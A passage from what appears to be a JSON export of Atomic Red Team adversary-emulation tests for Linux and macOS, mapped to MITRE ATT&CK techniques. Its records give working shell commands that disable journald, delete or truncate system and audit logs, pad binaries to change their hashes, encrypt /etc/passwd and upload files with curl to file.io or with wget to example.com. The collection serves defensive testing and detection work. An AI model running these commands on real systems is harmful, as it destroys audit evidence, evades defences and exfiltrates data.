    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "The atomic test disables the journal logging using built-in systemctl utility\n",
    "indexed_technique": "T1562.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562",
    "display_name": "Impair Defenses",
    "source_file": "T1562.yaml",
    "test_name": "Disable journal logging via sed utility",
    "test_guid": "12e5551c-8d5c-408e-b3e4-63f53b03379f",
    "description": "The test disables the journal logging by searching and replacing the \"Storage\" parameter to \"none\" within the journald.conf file, thus any new journal entries will only be temporarily available in memory and not written to disk\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf\n",
      "cleanup_command": "sudo sed -i 's/Storage=none/Storage=auto/' /etc/systemd/journald.conf #re-enables storage of journal data\nsudo systemctl restart systemd-journald #restart the journal service\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "The atomic test disables the journal logging by searching and replacing the \"Storage\" parameter to \"none\" within the journald.conf file, thus any new journal entries will only be temporarily available in memory and not written to disk\n",
    "indexed_technique": "T1562.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1027.001",
    "display_name": "Obfuscated Files or Information: Binary Padding",
    "source_file": "T1027.001.yaml",
    "test_name": "Pad Binary to Change Hash - Linux/macOS dd",
    "test_guid": "ffe2346c-abd5-4b45-a713-bf5f1ebd573a",
    "description": "Uses dd to add a zero byte, high-quality random data, and low-quality random data to the binary to change the hash.\n\nUpon successful execution, dd will modify `/tmp/binary`, therefore the expected hash will change.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "dd if=/dev/zero bs=1 count=1 >> #{file_to_pad} #adds null bytes\ndd if=/dev/random bs=1 count=1 >> #{file_to_pad} #adds high-quality random data\ndd if=/dev/urandom bs=1 count=1 >> #{file_to_pad} #adds low-quality random data\n",
      "cleanup_command": "rm #{file_to_pad}\n",
      "name": "sh"
    },
    "input_arguments": {
      "file_to_pad": {
        "description": "Path of binary to be padded",
        "type": "path",
        "default": "/tmp/binary"
      }
    },
    "dependencies": [
      {
        "description": "The binary must exist on disk at specified location (#{file_to_pad})\n",
        "prereq_command": "if [ -f #{file_to_pad} ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "cp /bin/ls #{file_to_pad}\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Uses dd to add a zero byte, high-quality random data, and low-quality random data to the binary to change the hash.\n\nUpon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.\n",
    "indexed_technique": "T1027.001.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1027.001",
    "display_name": "Obfuscated Files or Information: Binary Padding",
    "source_file": "T1027.001.yaml",
    "test_name": "Pad Binary to Change Hash using truncate command - Linux/macOS",
    "test_guid": "e22a9e89-69c7-410f-a473-e6c212cd2292",
    "description": "Uses truncate to add a byte to the binary to change the hash.\n\nUpon successful execution, truncate will modify `/tmp/binary`, therefore the expected hash will change.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "truncate -s +1 #{file_to_pad} #adds a byte to the file size\n",
      "cleanup_command": "rm #{file_to_pad}\n",
      "name": "sh"
    },
    "input_arguments": {
      "file_to_pad": {
        "description": "Path of binary to be padded",
        "type": "path",
        "default": "/tmp/binary"
      }
    },
    "dependencies": [
      {
        "description": "The binary must exist on disk at specified location (#{file_to_pad})\n",
        "prereq_command": "if [ -f #{file_to_pad} ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "cp /bin/ls #{file_to_pad}\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Uses truncate to add a byte to the binary to change the hash.\n\nUpon successful execution, truncate will modify `/tmp/evil-binary`, therefore the expected hash will change.\n",
    "indexed_technique": "T1027.001.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1098.004",
    "display_name": "SSH Authorized Keys",
    "source_file": "T1098.004.yaml",
    "test_name": "Modify SSH Authorized Keys",
    "test_guid": "342cc723-127c-4d3a-8292-9c0c6b4ecadc",
    "description": "Reads the contents of `~/.ssh/authorized_keys` and immediately overwrites the file with the same contents to verify write permissions.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo \"$ssh_authorized_keys\" > ~/.ssh/authorized_keys; fi;\n",
      "cleanup_command": "unset ssh_authorized_keys\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Modify contents of <user-home>/.ssh/authorized_keys to maintain persistence on victim host. \nIf the user is able to save the same contents in the authorized_keys file, it shows user can modify the file.\n",
    "indexed_technique": "T1098.004.01",
    "technique_index": 1,
    "categories": [
      "privilege-escalation",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1531",
    "display_name": "Account Access Removal",
    "source_file": "T1531.yaml",
    "test_name": "Change User Password via passwd",
    "test_guid": "3c717bf3-2ecc-4d79-8ac8-0bfbf08fbce6",
    "description": "Uses the `passwd` utility to change the password for the user `ARTUser`.",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "passwd #{user_account} #enter admin password > enter new password > confirm new password\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "user_account": {
        "description": "User account whose password will be changed.",
        "type": "string",
        "default": "ARTUser"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test changes the user password to hinder access to the account using passwd utility.\n",
    "indexed_technique": "T1531.01",
    "technique_index": 1,
    "categories": [
      "impact"
    ]
  },
  {
    "attack_technique": "T1070.002",
    "display_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
    "source_file": "T1070.002.yaml",
    "test_name": "rm -rf",
    "test_guid": "989cc1b1-3642-4260-a809-54f9dd559683",
    "description": "Deletes the system and audit logs (/var/log/system.log and /var/audit/20220725213300.202208110700021).",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "sudo rm -rf #{syslog_path}\nif [ -d /var/audit ] ; then sudo rm -rf #{macos_audit_path} ; fi\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "syslog_path": {
        "description": "path of syslog file to delete. On macos it's /var/log/system.log*, on linux, it's /var/log/syslog*. Also note for File events, that on macos, /var/ is a link to /private/var/.",
        "type": "string",
        "default": "/var/log/system.log"
      },
      "macos_audit_path": {
        "description": "path of audit file to delete",
        "type": "string",
        "default": "/var/audit/20220725213300.202208110700021"
      }
    },
    "dependencies": [
      {
        "description": "target files must exist\n",
        "prereq_command": "if [ -d /var/audit ] ; then stat #{macos_audit_path} ; fi && stat #{syslog_path}\n",
        "get_prereq_command": "touch #{syslog_path}\nif [ -d /var/audit ] ; then touch #{macos_audit_path} ; fi\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Delete system and audit logs\n",
    "indexed_technique": "T1070.002.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1070.002",
    "display_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
    "source_file": "T1070.002.yaml",
    "test_name": "rm -rf",
    "test_guid": "bd8ccc45-d632-481e-b7cf-c467627d68f9",
    "description": "Delete messages and security logs\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "rm -rf /var/log/messages\nrm -rf /var/log/security\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Delete messages and security logs\n",
    "indexed_technique": "T1070.002.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1070.002",
    "display_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
    "source_file": "T1070.002.yaml",
    "test_name": "Truncate system log files via truncate utility (freebsd)",
    "test_guid": "14033063-ee04-4eaf-8f5d-ba07ca7a097c",
    "description": "This test truncates the system log files using the truncate utility with (-s 0 or --size=0) parameter which sets file size to zero, thus emptying the file content\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "truncate -s 0 /var/log/messages #size parameter shorthand\ntruncate --size=0 /var/log/security #size parameter \n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test truncates the system log files using the truncate utility with (-s 0 or --size=0) parameter which sets file size to zero, thus emptying the file content\n",
    "indexed_technique": "T1070.002.03",
    "technique_index": 3,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1070.002",
    "display_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
    "source_file": "T1070.002.yaml",
    "test_name": "Delete log files via cat utility by appending /dev/null or /dev/zero (freebsd)",
    "test_guid": "369878c6-fb04-48d6-8fc2-da9d97b3e054",
    "description": "The first sub-test truncates the log file to zero bytes via /dev/null and the second sub-test fills the log file with null bytes(zeroes) via /dev/zero, using cat utility\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "cat /dev/null > /var/log/messages #truncating the file to zero bytes\ncat /dev/zero > /var/log/messages #log file filled with null bytes(zeros)\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "The first sub-test truncates the log file to zero bytes via /dev/null and the second sub-test fills the log file with null bytes(zeroes) via /dev/zero, using cat utility\n",
    "indexed_technique": "T1070.002.04",
    "technique_index": 4,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1070.002",
    "display_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
    "source_file": "T1070.002.yaml",
    "test_name": "Overwrite FreeBSD system log via echo utility",
    "test_guid": "11cb8ee1-97fb-4960-8587-69b8388ee9d9",
    "description": "This test overwrites the contents of system log file with an empty string using echo utility\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "echo '' > /var/log/messages\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test overwrites the contents of system log file with an empty string using echo utility\n",
    "indexed_technique": "T1070.002.05",
    "technique_index": 5,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1070.002",
    "display_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
    "source_file": "T1070.002.yaml",
    "test_name": "Delete system log files via unlink utility (freebsd)",
    "test_guid": "45ad4abd-19bd-4c5f-a687-41f3eee8d8c2",
    "description": "This test deletes the messages log file using unlink utility\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "unlink /var/log/messages\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test deletes the messages log file using unlink utility\n",
    "indexed_technique": "T1070.002.06",
    "technique_index": 6,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1070.002",
    "display_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
    "source_file": "T1070.002.yaml",
    "test_name": "Delete system journal logs via rm and journalctl utilities",
    "test_guid": "ca50dd85-81ff-48ca-92e1-61f119cb1dcf",
    "description": "The first sub-test deletes the journal files using rm utility in the \"/var/log/journal/\" directory and the second sub-test clears the journal by modifiying time period of logs that should be retained to zero.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sudo rm #{journal_folder}/* #physically deletes the journal files, and not just their content\nsudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "journal_folder": {
        "description": "path to journal logs",
        "type": "string",
        "default": "/var/log/journal"
      }
    },
    "dependencies": [
      {
        "description": "target files must exist\n",
        "prereq_command": "stat #{journal_folder}\n",
        "get_prereq_command": "mkdir -p #{journal_folder} && touch #{journal_folder}/T1070_002.journal\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "The first sub-test deletes the journal files using rm utility in the \"/var/log/journal/\" directory and the second sub-test clears the journal by modifiying time period of logs that should be retained to zero.\n",
    "indexed_technique": "T1070.002.07",
    "technique_index": 7,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1070.002",
    "display_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
    "source_file": "T1070.002.yaml",
    "test_name": "Overwrite Linux Mail Spool",
    "test_guid": "1602ff76-ed7f-4c94-b550-2f727b4782d4",
    "description": "This test overwrites the Linux mail spool of the `root` user.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "elevation_required": true,
      "command": "echo 0> /var/spool/mail/#{username}\n",
      "name": "bash"
    },
    "input_arguments": {
      "username": {
        "description": "Username of mail spool",
        "type": "string",
        "default": "root"
      }
    },
    "dependencies": [
      {
        "description": "target files must exist\n",
        "prereq_command": "stat /var/spool/mail/#{username}\n",
        "get_prereq_command": "touch /var/spool/mail/#{username}\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "This test overwrites the Linux mail spool of a specified user. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n",
    "indexed_technique": "T1070.002.08",
    "technique_index": 8,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1070.002",
    "display_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
    "source_file": "T1070.002.yaml",
    "test_name": "Overwrite Linux Log",
    "test_guid": "d304b2dc-90b4-4465-a650-16ddd503f7b5",
    "description": "This test overwrites the specified log (/var/log/secure).",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "echo 0> #{log_path}\n",
      "name": "bash",
      "elevation_required": true,
      "cleanup_command": "if [ \"/var/log/secure\" != \"#{log_path}\" ] ; then rm -f #{log_path} ; fi\n"
    },
    "input_arguments": {
      "log_path": {
        "description": "Path of specified log",
        "type": "path",
        "default": "/var/log/secure"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test overwrites the specified log. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n",
    "indexed_technique": "T1070.002.09",
    "technique_index": 9,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1016",
    "display_name": "System Network Configuration Discovery",
    "source_file": "T1016.yaml",
    "test_name": "System Network Configuration Discovery",
    "test_guid": "c141bbdb-7fca-4254-9fd6-f47e79447e17",
    "description": "Identify network configuration information.\nUpon successful execution, sh will spawn multiple commands and output will be via stdout.\n",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "if [ \"$(uname)\" = 'FreeBSD' ]; then cmd=\"netstat -Sp tcp\"; else cmd=\"netstat -ant\"; fi;\nif [ -x \"$(command -v arp)\" ]; then arp -a; else echo \"arp is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v ifconfig)\" ]; then ifconfig; else echo \"ifconfig is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v ip)\" ]; then ip addr; else echo \"ip is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v netstat)\" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo \"netstat is missing from the machine. skipping...\"; fi;\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if arp command exists on the machine\n",
        "prereq_command": "if [ -x \"$(command -v arp)\" ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "(which yum && yum -y install net-tools)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools)\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Identify network configuration information.\nUpon successful execution, sh will spawn multiple commands and output will be via stdout.\n",
    "indexed_technique": "T1016.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1486",
    "display_name": "Data Encrypted for Impact",
    "source_file": "T1486.yaml",
    "test_name": "Encrypt files using gpg (FreeBSD/Linux)",
    "test_guid": "7b8ce084-3922-4618-8d22-95f996173765",
    "description": "This test uses gpg to encrypt /etc/passwd with AES-256 and the password 'passwd', saving the output to /tmp/passwd.gpg.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "echo \"#{pwd_for_encrypted_file}\" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}\n",
      "cleanup_command": "rm #{encrypted_file_path}\n"
    },
    "input_arguments": {
      "pwd_for_encrypted_file": {
        "description": "the password that you want for the encrypted file",
        "type": "string",
        "default": "passwd"
      },
      "encrypted_file_path": {
        "description": "path to the encrypted file",
        "type": "path",
        "default": "/tmp/passwd.gpg"
      },
      "input_file_path": {
        "description": "path to the file that you want to encrypt",
        "type": "path",
        "default": "/etc/passwd"
      },
      "encryption_alg": {
        "description": "encryption algorithm of the file",
        "type": "string",
        "default": "AES-256"
      }
    },
    "dependencies": [
      {
        "description": "Finds where gpg is located\n",
        "prereq_command": "which_gpg=`which gpg`\n",
        "get_prereq_command": "(which pkg && pkg install -y gnupg)||(which yum && yum -y install epel-release gpg)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y gpg)\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "Uses gpg to encrypt a file\n",
    "indexed_technique": "T1486.01",
    "technique_index": 1,
    "categories": [
      "impact"
    ]
  },
  {
    "attack_technique": "T1486",
    "display_name": "Data Encrypted for Impact",
    "source_file": "T1486.yaml",
    "test_name": "Encrypt files using 7z (FreeBSD/Linux)",
    "test_guid": "53e6735a-4727-44cc-b35b-237682a151ad",
    "description": "This test uses 7z to encrypt /etc/passwd with the password 'passwd', saving the output to /tmp/passwd.zip.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "$which_7z a -p#{pwd_for_encrypted_file} #{encrypted_file_path} #{input_file_path}\n",
      "cleanup_command": "$which_7z e #{encrypted_file_path}\nrm #{encrypted_file_path}\n"
    },
    "input_arguments": {
      "pwd_for_encrypted_file": {
        "description": "the password that you want for the encrypted file",
        "type": "string",
        "default": "passwd"
      },
      "encrypted_file_path": {
        "description": "path to the encrypted file",
        "type": "path",
        "default": "/tmp/passwd.zip"
      },
      "input_file_path": {
        "description": "path to the file that you want to encrypt",
        "type": "path",
        "default": "/etc/passwd"
      }
    },
    "dependencies": [
      {
        "description": "Finds where 7z is located\n",
        "prereq_command": "which_7z=`which 7z`\n",
        "get_prereq_command": "(which pkg && pkg install -y 7-zip)\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "Uses 7z to encrypt a file\n",
    "indexed_technique": "T1486.02",
    "technique_index": 2,
    "categories": [
      "impact"
    ]
  },
  {
    "attack_technique": "T1486",
    "display_name": "Data Encrypted for Impact",
    "source_file": "T1486.yaml",
    "test_name": "Encrypt files using ccrypt (FreeBSD/Linux)",
    "test_guid": "08cbf59f-85da-4369-a5f4-049cffd7709f",
    "description": "This test copies /etc/passwd to /tmp/passwd and encrypts it with ccrypt using the password 'passwd', producing /tmp/passwd.cpt.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "which_ccencrypt=`which ccencrypt`\ncp #{root_input_file_path} #{cped_file_path};\n$which_ccencrypt -T -K #{pwd_for_encrypted_file} #{cped_file_path}\n",
      "cleanup_command": "rm #{cped_file_path}.cpt\n"
    },
    "input_arguments": {
      "cped_file_path": {
        "description": "Path where you want your copied file to be",
        "type": "path",
        "default": "/tmp/passwd"
      },
      "root_input_file_path": {
        "description": "Path the target file to be encrypted. File will be copied to /tmp/ before encrypting",
        "type": "path",
        "default": "/etc/passwd"
      },
      "pwd_for_encrypted_file": {
        "description": "Password to use for encryption",
        "type": "string",
        "default": "passwd"
      }
    },
    "dependencies": [
      {
        "description": "Finds where ccencrypt and ccdecrypt are located\n",
        "prereq_command": "which_ccencrypt=`which ccencrypt`\nwhich_ccdecrypt=`which ccdecrypt`\n",
        "get_prereq_command": "(which pkg && pkg install -y ccript)||(which yum && yum -y install epel-release ccrypt)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y ccrypt)\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Attempts to encrypt data on target systems as root to simulate an interruption authentication to target system. If root permissions are not available then attempts to encrypt data within user's home directory.\n",
    "indexed_technique": "T1486.03",
    "technique_index": 3,
    "categories": [
      "impact"
    ]
  },
  {
    "attack_technique": "T1486",
    "display_name": "Data Encrypted for Impact",
    "source_file": "T1486.yaml",
    "test_name": "Encrypt files using openssl (FreeBSD/Linux)",
    "test_guid": "142752dc-ca71-443b-9359-cf6f497315f1",
    "description": "This test uses openssl to generate a 2048-bit RSA key pair at /tmp/key.pem and /tmp/pub.pem, encrypting /etc/passwd to /tmp/passwd.zip.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "which_openssl=`which openssl`\n$which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}\n$which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}\n$which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}\n",
      "cleanup_command": "$which_openssl rsautl -decrypt -inkey #{private_key_path} -in #{encrypted_file_path}\nrm #{encrypted_file_path}\n"
    },
    "input_arguments": {
      "private_key_path": {
        "description": "path to the private key",
        "type": "path",
        "default": "/tmp/key.pem"
      },
      "public_key_path": {
        "description": "path to the public key",
        "type": "path",
        "default": "/tmp/pub.pem"
      },
      "encryption_bit_size": {
        "description": "size of the bit of encryption",
        "type": "integer",
        "default": 2048
      },
      "encrypted_file_path": {
        "description": "path to the encrypted file",
        "type": "path",
        "default": "/tmp/passwd.zip"
      },
      "input_file_path": {
        "description": "path to the file that you want to encrypt",
        "type": "path",
        "default": "/etc/passwd"
      }
    },
    "dependencies": [
      {
        "description": "Finds where openssl is located\n",
        "prereq_command": "which_openssl=`which openssl`\n",
        "get_prereq_command": ""
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "Uses openssl to encrypt a file\n",
    "indexed_technique": "T1486.04",
    "technique_index": 4,
    "categories": [
      "impact"
    ]
  },
  {
    "attack_technique": "T1048.002",
    "display_name": "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
    "source_file": "T1048.002.yaml",
    "test_name": "Exfiltrate data HTTPS using curl freebsd,linux or macos",
    "test_guid": "4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01",
    "description": "Uses `curl` to upload the file `PathToAtomicsFolder/T1048.002/src/artifact` to the file-sharing service `https://file.io/`.",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": false,
      "command": "curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/\n"
    },
    "input_arguments": {
      "input_file": {
        "description": "Test file to upload",
        "type": "path",
        "default": "PathToAtomicsFolder/T1048.002/src/artifact"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Exfiltrate data HTTPS using curl to file share site file.io\n",
    "indexed_technique": "T1048.002.01",
    "technique_index": 1,
    "categories": [
      "exfiltration"
    ]
  },
  {
    "attack_technique": "T1048.002",
    "display_name": "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
    "source_file": "T1048.002.yaml",
    "test_name": "Exfiltrate data in a file over HTTPS using wget",
    "test_guid": "7ccdfcfa-6707-46bc-b812-007ab6ff951c",
    "description": "Uses `wget` to upload the file `PathToAtomicsFolder/T1048.002/src/artifact` to the endpoint `https://example.com/`.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "wget --post-file=\"#{input_file}\" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after\n"
    },
    "input_arguments": {
      "input_file": {
        "description": "Test data to upload",
        "type": "path",
        "default": "PathToAtomicsFolder/T1048.002/src/artifact"
      },
      "endpoint_domain": {
        "description": "Endpoint to send data to",
        "type": "string",
        "default": "https://example.com/"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Exfiltrate data over HTTPS using wget --post-file method\n",
    "indexed_technique": "T1048.002.02",
    "technique_index": 2,
    "categories": [
      "exfiltration"
    ]
  },
  {
    "attack_technique": "T1048.002",
    "display_name": "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
    "source_file": "T1048.002.yaml",
    "test_name": "Exfiltrate data as text over HTTPS using wget",
    "test_guid": "8bec51da-7a6d-4346-b941-51eca448c4b0",
    "description": "Uses `wget` to upload the data `msg=AtomicTestT1048.002` to the endpoint `https://example.com/`.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "wget --post-data=\"msg=AtomicTestT1048.002\" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after\n"
    },
    "input_arguments": {
      "endpoint_domain": {
        "description": "Endpoint to send data to",
        "type": "string",
        "default": "https://example.com/"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Exfiltrate data over HTTPS using wget --post-data method\n",
    "indexed_technique": "T1048.002.03",
    "technique_index": 3,
    "categories": [
      "exfiltration"
    ]
  },
  {
    "attack_technique": "T1027",
    "display_name": "Obfuscated Files or Information",
    "source_file": "T1027.yaml",
    "test_name": "Decode base64 Data into Script",
    "test_guid": "f45df6be-2e1e-4136-a384-8f18ab3826fb",
    "description": "Creates a base64-encoded data file and decodes it into an executable shell script\n\nUpon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team` \nand uname -v\n",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "if [ \"$(uname)\" = 'FreeBSD' ]; then cmd=\"b64decode -r\"; else cmd=\"base64 -d\"; fi;\ncat /tmp/encoded.dat | $cmd > /tmp/art.sh\nchmod +x /tmp/art.sh\n/tmp/art.sh\n",
      "cleanup_command": "rm /tmp/encoded.dat \nrm /tmp/art.sh\n",
      "name": "sh"
    },
    "input_arguments": {
      "shell_command": {
        "description": "command to encode",
        "type": "string",
        "default": "echo Hello from the Atomic Red Team && uname -v"
      }
    },
    "dependencies": [
      {
        "description": "encode the command into base64 file\n",
        "prereq_command": "if [ -e \"/tmp/encoded.dat\" ]; then exit 0; else exit 1; fi\n",
        "get_prereq_command": "if [ \"$(uname)\" = 'FreeBSD' ]; then cmd=\"b64encode -r -\"; else cmd=\"base64\"; fi;\necho \"#{shell_command}\" | $cmd > /tmp/encoded.dat\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Creates a base64-encoded data file and decodes it into an executable shell script\n\nUpon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team` \nand uname -v\n",
    "indexed_technique": "T1027.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1018",
    "display_name": "Remote System Discovery",
    "source_file": "T1018.yaml",
    "test_name": "Remote System Discovery - arp nix",
    "test_guid": "acb6b1ff-e2ad-4d64-806c-6c35fe73b951",
    "description": "Identify remote systems via arp.\n\nUpon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "arp -a | grep -v '^?'\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if arp command exists on the machine\n",
        "prereq_command": "if [ -x \"$(command -v arp)\" ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "(which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools)\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Identify remote systems via arp.\n\nUpon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.\n",
    "indexed_technique": "T1018.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1018",
    "display_name": "Remote System Discovery",
    "source_file": "T1018.yaml",
    "test_name": "Remote System Discovery - sweep",
    "test_guid": "96db2632-8417-4dbb-b8bb-a8b92ba391de",
    "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if an IP is active.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo \"#{subnet}.$ip UP\" || : ; done\n",
      "name": "sh"
    },
    "input_arguments": {
      "start_host": {
        "description": "Subnet used for ping sweep.",
        "type": "string",
        "default": "1"
      },
      "stop_host": {
        "description": "Subnet used for ping sweep.",
        "type": "string",
        "default": "254"
      },
      "subnet": {
        "description": "Subnet used for ping sweep.",
        "type": "string",
        "default": "192.168.1"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Identify remote systems via ping sweep.\n\nUpon successful execution, sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if an IP is active.\n",
    "indexed_technique": "T1018.02",
    "technique_index": 2,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1018",
